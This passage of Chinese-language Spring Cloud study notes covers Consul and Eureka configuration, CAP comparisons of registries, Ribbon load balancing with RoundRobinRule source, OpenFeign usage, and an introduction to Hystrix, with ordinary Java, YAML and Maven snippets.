<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment">###consul服务端口号</span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">80</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">cloud-consumer-order</span></span><br><span class="line">  <span class="comment">####consul注册中心地址</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">consul:</span></span><br><span class="line">      <span class="attr">host:</span> <span class="string">localhost</span></span><br><span class="line">      <span class="attr">port:</span> <span class="number">8500</span></span><br><span class="line">      <span class="attr">discovery:</span></span><br><span class="line">        <span class="comment">#hostname: 127.0.0.1</span></span><br><span class="line">        <span class="attr">service-name:</span> <span class="string">$&#123;spring.application.name&#125;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableDiscoveryClient</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OrderConsulMain80</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(OrderConsulMain80.class,args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ApplicationContextConfig</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="meta">@LoadBalanced</span> <span class="comment">//使得zkorder80具有负载均衡能力</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> RestTemplate <span class="title">getRestTemplate</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> RestTemplate();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://csn.damyoung.cn/image-20210129161328409.png" alt="image-20210129161328409"></p>
<p><img src="https://csn.damyoung.cn/image-20210129161338018.png" alt="image-20210129161338018"></p>
<h2 id="三个注册中心异同"><a href="#三个注册中心异同" class="headerlink" title="三个注册中心异同"></a>三个注册中心异同</h2><table>
<thead>
<tr>
<th>组件名</th>
<th>语言</th>
<th>CAP</th>
<th>服务健康检查</th>
<th>对外暴露接口</th>
<th>springCloud集成</th>
</tr>
</thead>
<tbody><tr>
<td>Eureka</td>
<td>Java</td>
<td>AP</td>
<td>可配支持</td>
<td>HTTP</td>
<td>已集成</td>
</tr>
<tr>
<td>Consul</td>
<td>Go</td>
<td>CP</td>
<td>支持</td>
<td>HTTP/DNS</td>
<td>已集成</td>
</tr>
<tr>
<td>Zookeeper</td>
<td>Java</td>
<td>CP</td>
<td>支持</td>
<td>客户端</td>
<td>已集成</td>
</tr>
</tbody></table>
<h3 id="CAP"><a href="#CAP" class="headerlink" title="CAP"></a>CAP</h3><p><img src="https://csn.damyoung.cn/image-20210129174144364.png" alt="image-20210129174144364"></p>
<ul>
<li>Consistency强一致性</li>
<li>Availability可用性</li>
<li>Partition tolerance分区容错性</li>
</ul>
<p>CAP理论关注粒度是数据，而不是整体系统设计的策略</p>
<p>最多只能同时较好的满足俩个</p>
<p>核心：一个分布式系统不可能同时很好的满足一致性，可用性和分区容错性这三个需求，因此，根据CAP原理将NoSql数据库分成满足CA原则、满足CP原则和满足AP原则三大类</p>
<ol>
<li>CA-单点集群，满足一致性和可用性的系统，通常在可扩展性上不太强大</li>
<li>CP-满足一致性和分区容错性的系统，通常性能不是特别高</li>
<li>AP-满足可用性和分区容错性的系统，通常可能对一致性要求低一些</li>
</ol>
<h3 id="AP架构"><a href="#AP架构" class="headerlink" title="AP架构"></a>AP架构</h3><blockquote>
<p>Eureka</p>
</blockquote>
<p>当网络分区出现后，为了保证可用性，系统B可以返回旧值，保证系统的可用性</p>
<p>结论：违背了一致性C的要求，只满足可用性和分区容错，即AP</p>
<p><img src="https://csn.damyoung.cn/1597384508291.png" alt="1597384508291"></p>
<h3 id="CP架构"><a href="#CP架构" class="headerlink" title="CP架构"></a>CP架构</h3><blockquote>
<p>Zookeeper/Consul</p>
</blockquote>
<p>当网络分区出现后，为了保证一致性，就必须拒接请求，否则无法保证一致性</p>
<p>结论：违背了可用性A的要求，只满足一致性和分区容错，即CP</p>
<p><img src="https://csn.damyoung.cn/1597384554249.png"></p>
<h1 id="服务调用"><a href="#服务调用" class="headerlink" title="服务调用"></a>服务调用</h1><blockquote>
<p>都是使用在client端，即有“消费者”需求的模块中</p>
</blockquote>
<h2 id="Ribbon"><a href="#Ribbon" class="headerlink" title="Ribbon"></a>Ribbon</h2><blockquote>
<p>提前启动eureka集群环境(5个模块)</p>
</blockquote>
<p><img src="https://csn.damyoung.cn/image-20210129205442752.png" alt="image-20210129205442752"></p>
<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Spring Cloud Ribbon是基于Netflix Ribbon实现的一套客户端，<strong>负载均衡的工具</strong></p>
<p>Ribbon是Netflix发布的开源项目，主要功能是提供客户端的软件负载均衡算法和服务调用。Ribbon客户端组件提供一系列完善的配置项如连接超时，重试等，简单来说，就是在配置文件中列出Load Balancer(简称LB)后面所有的机器，Ribbon会自动的帮助你基于某种规则(如简单轮询，随机连接等)去连接这些机器，我们很容易使用Ribbon实现自定义的负载均衡算法</p>
<p>官网-github.com/Netflix/ribbon</p>
<p><strong>LB负载均衡(load Balance)是什么？</strong></p>
<p>简单的说就是将用户的请求平摊的分配到多个服务上，从而达到系统的HA(高可用)</p>
<p>常用的负载均衡有软件Niginx,LVS，硬件F5等</p>
<p><strong>Ribbon本地负载均衡客户端和Nginx服务端负载均衡的区别</strong></p>
<p>Nginx是服务器负载均衡，客户端所有请求都会交给nginx，然后由nginx实现转发请求，即负载均衡是由服务端实现的</p>
<p>Ribbon本地负载均衡，在调用微服务接口时，会在注册中心上获取注册信息服务列表之后缓存到JVM本地，从而在本地实现RPC远程服务调用技术</p>
<p>**集中式:**即在服务消费方和提供方之间使用独立的LB设施(可以是硬件，如F5，也可以是软件nginx)，由该设施负责把访问请求通过某种策略转发至服务的提供方</p>
<p><strong>进程内：</strong>将LB逻辑集成到消费方，消费方从服务注册中心获知有哪些地址可用，然后自己再从地址中选择出一个合适的服务器</p>
<p>Ribbon属于进程内LB，它只是一个类库，集成与消费方进程，消费方通过它来获取到服务提供方的地址</p>
<p><img src="https://csn.damyoung.cn/image-20210129223513191.png" alt="image-20210129223513191"></p>
<p><strong>Ribbon在工作时分成两步</strong></p>
<ol>
<li><p>先选择EurekaServer,它优先选择在同一个区域内<strong>负载较少</strong>的server</p>
</li>
<li><p>再根据用户指定的策略，在从server取到的服务注册列表中选择一个地址</p>
<p>其中Ribbon提供多种策略算法：比如轮询、随机、根据响应时间加权</p>
</li>
</ol>
<p>上面在eureka时，确实实现了负载均衡机制，那是因为eureka-client包里面自带着ribbon</p>
<p><img src="https://csn.damyoung.cn/image-20210129223916168.png" alt="image-20210129223916168"></p>
<p>Ribbon就是<strong>负载均衡+restTemplate</strong>实现RPC远程调用，实际上不止eureka的jar包有，zookeeper的jar包，还有consul的jar包都包含，就是上面使用的服务调用</p>
<h3 id="RestTemplate-1"><a href="#RestTemplate-1" class="headerlink" title="RestTemplate"></a>RestTemplate</h3><p><code>getForObject()</code>返回对象为响应体中数据转化成的对象，基本上可以理解为json</p>
<p><code>getForEntity()</code>返回对象为<code>ResponseEntity</code>对象，包含了响应中的一些重要信息，比如响应头、响应状态码、响应体</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/consumer/payment/get/&#123;id&#125;&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> CommonResult&lt;Payment&gt; <span class="title">getPayment</span><span class="params">(<span class="meta">@PathVariable(&quot;id&quot;)</span> Long id)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> restTemplate.getForObject(PAYMENT_URL+<span class="string">&quot;/payment/get/&quot;</span>+id,CommonResult.class);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@GetMapping(&quot;/consumer/payment/getForEntity/&#123;id&#125;&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> CommonResult <span class="title">getPayment2</span><span class="params">(<span class="meta">@PathVariable(&quot;id&quot;)</span> Long id)</span></span>&#123;</span><br><span class="line">    ResponseEntity&lt;CommonResult&gt; entity=restTemplate.getForEntity(PAYMENT_URL+<span class="string">&quot;/payment/get/&quot;</span>+id,CommonResult.class);</span><br><span class="line">    <span class="keyword">if</span> (entity.getStatusCode().is2xxSuccessful())&#123;</span><br><span class="line">        log.info(entity.getStatusCode()+<span class="string">&quot;\t&quot;</span>+entity.getHeaders());</span><br><span class="line">        <span class="comment">//返回请求体</span></span><br><span class="line">        <span class="keyword">return</span> entity.getBody();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> CommonResult&lt;&gt;(<span class="number">444</span>,<span class="string">&quot;操作失败&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="核心组件IRule"><a href="#核心组件IRule" class="headerlink" title="核心组件IRule"></a>核心组件IRule</h3><h4 id="种类"><a href="#种类" class="headerlink" title="种类"></a>种类</h4><p>iRule:根据特点算法中从服务列表中选取一个要访问的服务</p>
<p><img src="https://csn.damyoung.cn/image-20210129230137208.png" alt="image-20210129230137208"></p>
<h4 id="替换"><a href="#替换" class="headerlink" title="替换"></a>替换</h4><p>官方文档明确作出警告，这个自定义配置类不能放在<code>@ComponentScan</code>所扫描的当前包下以及子包下，否则我们自定义的这个配置类就会被所有的Ribbon客户端所共享，达不到特殊化定制的目的了</p>
<blockquote>
<p>@SpringBootApplication注解会扫描当前包或者当前包的子包</p>
</blockquote>
<p><img src="https://csn.damyoung.cn/image-20210129230506177.png" alt="image-20210129230506177"></p>
<p><img src="https://csn.damyoung.cn/image-20210129230910321.png" alt="image-20210129230910321"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MySelfRule</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> IRule <span class="title">myRule</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> RandomRule();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@EnableEurekaClient</span></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@RibbonClient(name = &quot;cloud-payment-service&quot;,configuration = MySelfRule.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OrderMain80</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(OrderMain80.class,args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="负载均衡算法"><a href="#负载均衡算法" class="headerlink" title="负载均衡算法"></a>负载均衡算法</h3><h4 id="轮询算法"><a href="#轮询算法" class="headerlink" title="轮询算法"></a>轮询算法</h4><p>rest接口第几次请求数%服务器集群总数量=实际调用服务器位置下标，每次服务重启动rest接口计数从1开始</p>
<p><img src="https://csn.damyoung.cn/image-20210130104951315.png" alt="image-20210130104951315"></p>
<h4 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h4><p>RoundRobinRule.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//ILoadBalancer采用何种负载均衡算法</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Server <span class="title">choose</span><span class="params">(ILoadBalancer lb, Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (lb == <span class="keyword">null</span>) &#123;</span><br><span class="line">        log.warn(<span class="string">&quot;no load balancer&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Server server = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (server == <span class="keyword">null</span> &amp;&amp; count++ &lt; <span class="number">10</span>) &#123;</span><br><span class="line">                <span class="comment">//可达服务</span></span><br><span class="line">                List&lt;Server&gt; reachableServers = lb.getReachableServers();</span><br><span class="line">                <span class="comment">//总服务数</span></span><br><span class="line">                List&lt;Server&gt; allServers = lb.getAllServers();</span><br><span class="line">                <span class="keyword">int</span> upCount = reachableServers.size();</span><br><span class="line">                <span class="keyword">int</span> serverCount = allServers.size();</span><br><span class="line">                <span class="keyword">if</span> (upCount != <span class="number">0</span> &amp;&amp; serverCount != <span class="number">0</span>) &#123;</span><br><span class="line"> 					<span class="comment">//求余方法 得到实际调用服务器下标	</span></span><br><span class="line">                    <span class="keyword">int</span> nextServerIndex = <span class="keyword">this</span>.incrementAndGetModulo(serverCount);</span><br><span class="line">                    <span class="comment">//根据轮询下标得到服务器对象</span></span><br><span class="line">                    server = (Server)allServers.get(nextServerIndex);</span><br><span class="line">                    <span class="keyword">if</span> (server == <span class="keyword">null</span>) &#123;</span><br><span class="line">                        Thread.yield();</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (server.isAlive() &amp;&amp; server.isReadyToServe()) &#123;</span><br><span class="line">                            <span class="keyword">return</span> server;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        server = <span class="keyword">null</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">             log.warn(<span class="string">&quot;No up servers available from load balancer: &quot;</span> + lb);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (count &gt;= <span class="number">10</span>) &#123;</span><br><span class="line">            log.warn(<span class="string">&quot;No available alive servers after 10 tries from load balancer: &quot;</span> + lb);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> server;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//求余</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">incrementAndGetModulo</span><span class="params">(<span class="keyword">int</span> modulo)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> current;</span><br><span class="line">    <span class="keyword">int</span> next;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        current = <span class="keyword">this</span>.nextServerCyclicCounter.get();</span><br><span class="line">        next = (current + <span class="number">1</span>) % modulo;</span><br><span class="line">    &#125; <span class="keyword">while</span>(!<span class="keyword">this</span>.nextServerCyclicCounter.compareAndSet(current, next));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="OpenFeign"><a href="#OpenFeign" class="headerlink" title="OpenFeign"></a>OpenFeign</h2><h3 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h3><p>服务接口+调用</p>
<p>官网<a href="http://github.com/spring-cloud/spring-cloud-openfeign">http://github.com/spring-cloud/spring-cloud-openfeign</a></p>
<p>Feign是一个声明式WebService客户端，Feign旨在使编写Web Service客户端更加简单，<strong>只需要创建一个接口并在接口上添加注解即可</strong></p>
<p>前面使用Ribbon+RestTemplate时，利用RestTemplate对http请求的封装处理，形成了一套模板化的调用方法。但是在实际开发中，由于对服务依赖的调用可能不止一处，往往一个接口会被多处调用，所以通常都会针对每个微服务自行<strong>封装一些客户端类</strong>来包装这些依赖服务的调用，所以，Feign在此基础上做了进一步封装，由他来帮助我们定义和实现依赖服务接口的定义。</p>
<p>在Feign的实现下，我们只需创建一个接口并使用注解的方式来配置它(以前是Dao接口上面标注Mapper注解，现在是一个微服务接口上面标注一个Feign注解即可)，即可<strong>完成对服务提供方的接口绑定</strong>，简化了使用SpringCloud Ribbon时，自动封装服务调用客户端的开发量。</p>
<p><strong>Feign集成了Ribbon</strong></p>
<p>利用了Ribbon维护了Payment的服务列表信息，并且通过轮询实现了客户端的负载均衡，而与Ribbon不同的是，通过Feign只需要<strong>定义服务绑定接口且以声明式的方法</strong>，简单的实现了服务调用</p>
<p>它的使用方法是定义一个服务接口然后在上面添加注解，Feign也支持可拔插式的编码器和解码器，SpringCloud对Fegin进行封装，使其支持了SpringMVC标准注解和HttpMessageConverters。Fegin可以与Eureka和Ribbon组合使用以支持负载均衡</p>
<h4 id="Fegin和OpenFeign"><a href="#Fegin和OpenFeign" class="headerlink" title="Fegin和OpenFeign"></a>Fegin和OpenFeign</h4><p><img src="https://csn.damyoung.cn/image-20210130114057764.png" alt="image-20210130114057764"></p>
<h3 id="使用步骤"><a href="#使用步骤" class="headerlink" title="使用步骤"></a>使用步骤</h3><p><img src="https://csn.damyoung.cn/image-20210130114401837.png" alt="image-20210130114401837"></p>
<h4 id="创建cloud-consumer-feign-order80"><a href="#创建cloud-consumer-feign-order80" class="headerlink" title="创建cloud-consumer-feign-order80"></a>创建cloud-consumer-feign-order80</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-openfeign<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.1.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--eureka-client--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-netflix-eureka-client<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">80</span></span><br><span class="line"></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">register-with-eureka:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">      <span class="attr">defaulZone:</span> <span class="string">http://eureka7001.com:7001/eureka/,http://eureka7002.com:7002/eureka/</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableFeignClients</span> <span class="comment">//使用feign激活开启</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OrderFeignMain80</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(OrderFeignMain80.class,args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@FeignClient(value = &quot;cloud-payment-service&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">PaymentFeignService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(value = &quot;/payment/get/&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="function">CommonResult&lt;Payment&gt; <span class="title">getPaymentById</span><span class="params">(<span class="meta">@PathVariable(&quot;id&quot;)</span>Long id)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OrderFeignController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> PaymentFeignService paymentFeignService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/consumer/payment/get/&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> CommonResult&lt;Payment&gt; <span class="title">getPaymentById</span><span class="params">(<span class="meta">@PathVariable(&quot;id&quot;)</span>Long id)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> paymentFeignService.getPaymentById(id);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="超时控制"><a href="#超时控制" class="headerlink" title="超时控制"></a>超时控制</h3><p>默认Feign客户端只等待一秒钟，但是服务端处理需要超过1秒钟，导致Feign客户端不想等待，直接返回报错，为了避免这样的情况，有时候我们需要设置Feign客户端的超时控制</p>
<p>yml开启配置</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment">#设置feign客户端超时时间(openFeign默认支持ribbon</span></span><br><span class="line"><span class="attr">ribbon:</span></span><br><span class="line"><span class="comment">#  指的是建立连接后从服务器读取到可用资源的时间</span></span><br><span class="line">  <span class="attr">ReadTimeOut:</span> <span class="number">5000</span></span><br><span class="line"><span class="comment">#  指的是建立连接所用的时间，适用于网络状况正常的情况下,俩端连接所用的时间</span></span><br><span class="line">  <span class="attr">ConnectTimeOut:</span> <span class="number">5000</span></span><br></pre></td></tr></table></figure>

<h3 id="日志打印"><a href="#日志打印" class="headerlink" title="日志打印"></a>日志打印</h3><p>Feign提供了日志打印功能，我们可以通过配置来调整日志级别，从而了解Feign中http请求的细节</p>
<p>对feign接口的调用情况进行监控和输出</p>
<p><img src="https://csn.damyoung.cn/image-20210130143652171.png" alt="image-20210130143652171"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FeignConfig</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    Logger.<span class="function">Level <span class="title">feignLoggerLevel</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Logger.Level.FULL;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">logging:</span></span><br><span class="line">  <span class="attr">level:</span></span><br><span class="line"><span class="comment">#    feign日志以什么级别监控哪个接口</span></span><br><span class="line">    <span class="attr">com.example.service.PaymentFeignService:</span> <span class="string">debug</span></span><br></pre></td></tr></table></figure>

<h1 id="Hystrix"><a href="#Hystrix" class="headerlink" title="Hystrix"></a>Hystrix</h1><blockquote>
<p>服务降级，服务熔断，接近实时的监控</p>
</blockquote>
<p>官网：<a href="https://github.com/Netflix/Hystrix/wiki/How-To-Use">https://github.com/Netflix/Hystrix/wiki/How-To-Use</a></p>
<blockquote>
<p>分布式系统面临的问题？</p>
<p>复杂分布式体系结构中的应用程序有数十个依赖关系，每个依赖关系在某些时候将不可避免的失败</p>
</blockquote>
<p><strong>服务雪崩</strong></p>
<p>多个微服务之间调用的时候，假设微服务A调用微服务B和微服务C，微服务B和微服务C又调用其他的微服务，这就是所谓的”<strong>扇出</strong>“，如果扇出的链路上某个微服务的调用响应时间过长或者不可用，对微服务A的调用就会占用越来越多的系统资源，进而引起系统崩溃，所谓的”雪崩效应”</p>
<p>对于高 流量的应用来说，单一的后端依赖可能会导致所有服务器上的所有资源都在几秒钟内饱和，比失败更糟糕的是，这些应用程序还可能导致服务之间的延迟增加，备份队列，线程和其他系统资源紧张，导致整个系统发生更多的级联故障，这些都表示需要对故障和延迟进行隔离和管理，以便单个依赖关系的失败，不能取消整个应用程序或系统。</p>
<h2 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h2><p>Hysrix是一个用于处理分布式系统的<strong>延迟和容错</strong>的开源库，在分布式系统里，许多依赖不可避免的会调用失败，比如超时、异常等，Hystrix能够保证在一个依赖出问题的情况下，不会导致整体服务失败，避免级联故障，以提高分布式系统的弹性</p>
<p>“断路器”本身是一种开关装置，当某个服务单元发生故障之后，通过断路器的故障监控(雷士熔断保险丝)，向调用方法返回一个符合预期的、可处理的备选响应(FallBack)，而不是长时间的等待或者抛出调用方无法处理的异常，这样就保证了服务调用方的线程不会被长时间、不必要的占用，从而避免了故障在分布式系统中的蔓延，乃至雪崩。</p>
<h2 id="重要概念"><a href="#重要概念" class="headerlink" title="重要概念"></a>重要概念</h2><h3 id="服务降级"><a href="#服务降级" class="headerlink" title="服务降级"></a>服务降级</h3><p>服务器忙，请稍后再试，不让客户端等待并立即返回一个友好提示，fallback</p>
<ul>
<li>程序运行异常</li>
<li>超时</li>
<li>服务熔断触发服务降级</li>
<li>线程池/信号量打满也会导致服务降级</li>
</ul>
<h3 id="服务熔断"><a href="#服务熔断" class="headerlink" title="服务熔断"></a>服务熔断</h3><p>类比保险丝达到最大服务访问后，直接拒绝访问，拉闸停电，然后调用服务降级的方法并返回友好提示</p>
<p>服务降级==&gt;进而熔断==&gt;恢复调用链路</p>
<h3 id="服务限流"><a href="#服务限流" class="headerlink" title="服务限流"></a>服务限流</h3><p>秒杀高并发等操作，严禁一窝蜂的过来拥挤，大家排队，一秒钟N个，有序进行</p>
<h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><p>cloud-provider-hystrix-payment8001</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--        hystrix--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-netflix-hystrix<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        Eureka Client--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-netflix-eureka-client<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>druid-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.1.10<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--mysql-connector-java--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span 